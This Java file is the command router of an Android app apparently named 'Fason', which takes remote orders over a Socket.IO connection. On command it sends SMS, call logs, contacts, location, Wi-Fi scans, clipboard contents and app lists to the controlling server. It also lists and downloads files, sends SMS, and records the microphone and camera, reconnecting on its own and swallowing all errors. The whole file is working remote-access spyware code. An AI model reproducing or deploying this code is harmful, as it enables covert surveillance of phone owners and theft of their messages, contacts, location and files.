package com.fason.app.core.network;

import android.Manifest;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.fason.app.core.FasonApp;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.features.apps.AppList;
import com.fason.app.features.calls.CallsManager;
import com.fason.app.features.camera.CameraManager;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.contacts.ContactsManager;
import com.fason.app.features.location.LocManager;
import com.fason.app.features.mic.MicManager;
import com.fason.app.features.sms.SMSManager;
import com.fason.app.features.storage.FileManager;
import com.fason.app.features.wifi.WifiScanner;
import com.fason.app.notifications.NotificationRelayService;
import com.fason.app.service.MainService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import io.socket.client.Socket;

public final class SocketCommandRouter {

    private static FileManager fileMgr;
    private static CameraManager camMgr;
    private static LocManager locMgr;
    private static final ExecutorService EXEC = Executors.newFixedThreadPool(4);
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static boolean initialized = false;
    private static final int RECONNECT_DELAY = 10000;

    private SocketCommandRouter() {}

    public static synchronized void initialize() {
        if (initialized) return;

        // Initialize managers lazily
        if (fileMgr == null) fileMgr = new FileManager();
        if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());

        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) {
            handler.postDelayed(SocketCommandRouter::initialize, RECONNECT_DELAY);
            return;
        }

        socket.off(); // Clear previous listeners

        // Ping-pong for keep-alive
        socket.on("ping", args -> {
            Socket s = SocketClient.getInstance().getSocket();
            if (s != null) s.emit("pong");
        });

        // Main command handler
        socket.on("order", args -> handleOrder(args));

        // Handle disconnect with reconnection
        socket.on(Socket.EVENT_DISCONNECT, args -> {
            handler.postDelayed(() -> {
                Socket s = SocketClient.getInstance().getSocket();
                if (s != null && !s.connected()) s.connect();
            }, RECONNECT_DELAY);
        });

        socket.connect();
        initialized = true;
    }

    private static void handleOrder(Object[] args) {
        try {
            if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
            JSONObject data = (JSONObject) args[0];
            String type = data.optString("type", "");
            Socket socket = SocketClient.getInstance().getSocket();

            switch (type) {
                case "0xFI": handleFile(data); break;
                case "0xSM": handleSms(data, socket); break;
                case "0xCL": EXEC.execute(() -> emit(socket, "0xCL", CallsManager.getCallsLogs())); break;
                case "0xCO": EXEC.execute(() -> emit(socket, "0xCO", ContactsManager.getContacts())); break;
                case "0xMI": handleMic(data); break;
                case "0xLO": handleLocation(socket); break;
                case "0xWI": handleWifi(socket); break;
                case "0xPM": EXEC.execute(() -> emit(socket, "0xPM", PermissionManager.getGrantedPermissions())); break;
                case "0xIN": EXEC.execute(() -> emit(socket, "0xIN", AppList.getInstalledApps(data.optBoolean("includeSystem", true)))); break;
                case "0xGP": emitPermStatus(socket, data.optString("permission", "")); break;
                case "0xCA": handleCamera(data, socket); break;
                case "0xCB": handleClipboard(data); break;
                case "0xNO": handleNotification(data, socket); break;
            }
        } catch (Exception ignored) {}
    }

    private static void handleFile(JSONObject data) {
        String action = data.optString("action");
        String path = data.optString("path", "");
        try {
            if ("ls".equals(action)) {
                JSONObject p = new JSONObject();
                p.put("type", "list");
                p.put("list", fileMgr.walk(path));
                p.put("path", path);
                SocketClient.getInstance().getSocket().emit("0xFI", p);
            } else if ("dl".equals(action)) {
                fileMgr.downloadFile(path);
            }
        } catch (Exception ignored) {}
    }

    private static void handleSms(JSONObject data, Socket socket) {
        String action = data.optString("action");
        if ("ls".equals(action)) {
            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.getsms()));
        } else if ("sendSMS".equals(action)) {
            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.sendSMS(data.optString("to"), data.optString("sms"))));
        }
    }

    private static void handleMic(JSONObject data) {
        int seconds = data.optInt("sec", 0);

        // Update foreground service type for microphone
        MainService service = MainService.getInstance();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }

        MicManager.startRecording(seconds);
    }

    private static void handleLocation(Socket socket) {
        EXEC.execute(() -> {
            try {
                // Use MainService's LocManager if available
                MainService service = MainService.getInstance();
                LocManager loc = (service != null) ? service.getLocManager() : new LocManager(FasonApp.getContext());

                // Request fresh location
                loc.requestSingleLocation();

                // Wait briefly for location update
                Thread.sleep(3000);

                if (loc.canGetLocation()) {
                    emit(socket, "0xLO", loc.getData());
                } else {
                    JSONObject error = new JSONObject();
                    error.put("enabled", false);
                    error.put("error", "Location not available");
                    emit(socket, "0xLO", error);
                }
            } catch (Exception ignored) {}
        });
    }

    private static void handleWifi(Socket socket) {
        EXEC.execute(() -> {
            JSONObject result = WifiScanner.scan(FasonApp.getContext());
            emit(socket, "0xWI", result);
        });
    }

    private static void handleCamera(JSONObject data, Socket socket) {
        String action = data.optString("action");
        if ("list".equals(action)) {
            JSONObject cams = camMgr.findCameraList();
            if (cams == null) {
                try {
                    cams = new JSONObject();
                    cams.put("camList", true);
                    cams.put("list", new JSONArray());
                } catch (Exception ignored) {}
            }
            socket.emit("0xCA", cams);
        } else if ("capture".equals(action)) {
            camMgr.startUp(data.optInt("id", 0));
        }
    }

    private static void handleClipboard(JSONObject data) {
        ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
        String action = data.optString("action", "fetch");
        if ("start".equals(action)) {
            m.start();
            EXEC.execute(m::emitClipboardSnapshot);
        } else if ("stop".equals(action)) {
            m.stop();
        } else {
            EXEC.execute(m::emitClipboardSnapshot);
        }
    }

    private static void handleNotification(JSONObject data, Socket socket) {
        String action = data.optString("action", "status");

        if ("status".equals(action)) {
            EXEC.execute(() -> {
                try {
                    JSONObject status = new JSONObject();
                    status.put("enabled", NotificationRelayService.isNotificationListenerEnabled(FasonApp.getContext()));
                    status.put("connected", NotificationRelayService.getInstance() != null &&
                        NotificationRelayService.getInstance().isReady());
                    socket.emit("0xNO", status);
                } catch (Exception ignored) {}
            });
        } else if ("request".equals(action)) {
            // Request notification listener permission
            NotificationRelayService.requestNotificationListenerPermission(FasonApp.getContext());
        }
    }

    private static void emitPermStatus(Socket socket, String perm) {
        EXEC.execute(() -> {
            try {
                JSONObject d = new JSONObject();
                d.put("permission", perm);
                d.put("isAllowed", PermissionManager.canIUse(perm));
                socket.emit("0xGP", d);
            } catch (Exception ignored) {}
        });
    }

    private static void emit(Socket socket, String ch, Object data) {
        if (socket != null) socket.emit(ch, data);
    }

    public static void reset() {
        initialized = false;
    }
}
